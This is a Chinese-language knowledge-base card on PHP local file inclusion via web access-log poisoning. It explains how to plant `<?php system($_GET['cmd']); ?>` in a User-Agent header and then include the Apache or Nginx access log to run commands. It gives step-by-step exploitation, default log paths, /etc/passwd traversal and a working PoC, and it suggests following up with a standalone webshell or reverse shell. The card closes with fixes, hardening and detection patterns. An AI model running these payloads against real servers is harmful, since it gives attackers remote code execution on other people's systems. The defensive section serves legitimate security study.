---
id: web-php-file-inclusion-access-log-poisoning-webshell
title: LFI 包含 Web 访问日志 getshell：把 PHP 代码写进 User-Agent 或请求行
type: scenario
domain: web
path: web/php/file-inclusion
technique: lfi-access-log-poisoning
aliases:
- 日志包含 getshell
- access.log 包含
- User-Agent 投毒
- Apache 日志包含
- Nginx 日志包含
- LFI 日志投毒
tags:
- php
- lfi
- file-inclusion
- log-poisoning
- webshell
- apache
- nginx
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:15:36+08:00'
  notes: 原文无图片，已核对日志包含链：先投毒 User-Agent/请求行/Referer，再 LFI 包含 access.log 执行 PHP；卡中强调日志在响应后写入、需二次请求，并纠正 /proc/self/environ 在 PHP-FPM 下常不可用的成功率问题。Apache/Nginx 路径与 open_basedir 边界正确。原文未涉及版本区间。未执行 PoC。
---

## 一句话结论

当存在 PHP 本地文件包含（LFI）且 Web 服务器访问日志可被 Web 进程读取时，攻击者先把 `<?php ... ?>` 写进 `User-Agent`（或请求行、Referer），日志会原样记录该内容；随后用 LFI 包含 `access.log`，PHP 会把日志当模板解析并执行其中的代码，从而获得 webshell。

## 原理

- Apache、Nginx 的访问日志默认记录请求行、状态码、`User-Agent`、`Referer` 等字段，这些字段由客户端控制，服务器通常只做最小转义（如引号、反斜杠），不会删除 `<?php`。
- PHP 的 `include`/`require` 会把目标文件按 PHP 模板解析：文件中的纯文本原样输出，`<?php ... ?>` 之间的内容作为 PHP 代码执行。日志文件对 PHP 来说就是一个普通文本文件，因此日志里的 Payload 会被执行。
- 关键时序：访问日志通常在响应结束后才写入，所以“包含日志”的请求本身不会包含它自己的 `User-Agent`。需要先发一个投毒请求把 Payload 写进日志，再发第二个请求包含日志。
- 成立条件：
  - 存在可控的 LFI（参数能指定日志路径，或可通过 `../` 到达日志目录）；
  - Web 进程对日志文件有读权限；
  - 日志路径已知且未被 `open_basedir` 等限制阻断；
  - 日志格式确实记录 `User-Agent`/`Referer`/请求行（自定义格式可能不记录）。
- 如果 LFI 会自动追加 `.php` 后缀，需要结合路径截断、`/proc/self/fd`、日志轮转文件名等技巧，或选择不追加后缀的包含点。

## 触发条件

- 存在 PHP 文件包含漏洞，且攻击者可控制包含路径。
- 目标为 Apache/Nginx 等会把请求头写入文本日志的服务器，日志对 Web 用户可读。
- 日志路径可预测（默认路径或通过报错/phpinfo 泄露）。
- `open_basedir`、`disable_functions` 未阻止包含或命令执行。

## 利用步骤

1. 确认 LFI：用 `?file=../../../../etc/passwd` 等读取系统文件，确认路径穿越可用。
2. 确认日志路径：Apache Debian/Ubuntu 常见 `/var/log/apache2/access.log`；RHEL/CentOS `/var/log/httpd/access_log`；Nginx `/var/log/nginx/access.log`；XAMPP `/xampp/apache/logs/access.log`。
3. 投毒：发送一个请求，把 PHP 代码放进 `User-Agent`（或 `Referer`、URL 路径）。
4. 包含：再发送一个请求，用 LFI 包含日志文件，并在查询参数中传入命令。
5. 验证命令执行；成功后写入独立 webshell 或建立反弹 shell，避免持续依赖日志。

## PoC

第一步：投毒日志。

```http
GET / HTTP/1.1
Host: target
User-Agent: <?php system($_GET['cmd']); ?>
```

或用 curl：

```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://target/
```

第二步：包含日志并执行命令。

```http
GET /index.php?file=../../../../var/log/apache2/access.log&cmd=id HTTP/1.1
Host: target
```

```bash
curl 'http://target/index.php?file=../../../../var/log/apache2/access.log&cmd=id'
```

日志中会出现类似记录：

```text
10.0.0.5 - - [05/Nov/2026:12:00:00 +0800] "GET / HTTP/1.1" 200 123 "-" "<?php system($_GET['cmd']); ?>"
```

包含后，`<?php ... ?>` 之外的日志文本被输出，PHP 代码执行，`cmd=id` 的结果出现在响应中。

## 变体与关联

- 变体：把 Payload 放在 `Referer`、请求路径（如 `GET /<?php ...?>`）或自定义头中，取决于日志格式记录哪些字段。
- 变体：`/proc/self/environ` 包含。只有在 CGI/FastCGI 把请求头以环境变量形式传入、且 `/proc/self/environ` 对 Web 用户可读时才可能生效；PHP-FPM 常看不到按请求的 `User-Agent`，成功率低于访问日志，需实测。
- 变体：Session 文件包含（把 PHP 代码写入 `$_SESSION`，包含 `/tmp/sess_<PHPSESSID>`）、SSH `auth.log`、邮件日志、应用自身日志。
- 关联：[[web-php-file-inclusion-php-error-log-poisoning-webshell]]（错误日志投毒的另一条路径）。
- 关联：[[web-php-file-inclusion-user-ini-session-save-path-webshell]]（把 Session 文件写入 Web 目录）。
- 边界：日志被实时转发到远端、Web 用户无读权限、`open_basedir` 限制日志目录、日志格式不记录可控字段时，本手法失效。

## 检测与防御

- 修复：消除文件包含漏洞，包含路径使用白名单映射，禁止用户直接指定文件。
- 加固：日志文件移出 Web 根目录，权限设为仅日志服务/root 可读；`open_basedir` 限制 PHP 可访问目录；关闭 `allow_url_include`。
- 加固：日志中对 `<`、`>`、`?` 等字符做 HTML 实体编码或转义，破坏 `<?php` 标签；使用不记录原始 `User-Agent` 的日志格式（但请求行仍可能可控）。
- 检测：`User-Agent`/`Referer`/URL 中出现 `<?php`、`<?=`、`system(`、`eval(`；Web 进程读取 `/var/log/*/access.log`；LFI 参数指向日志路径；日志中出现异常 PHP 代码片段。
- 响应：检查日志文件是否被包含执行、是否已落地 webshell；轮转并清理被污染的日志。
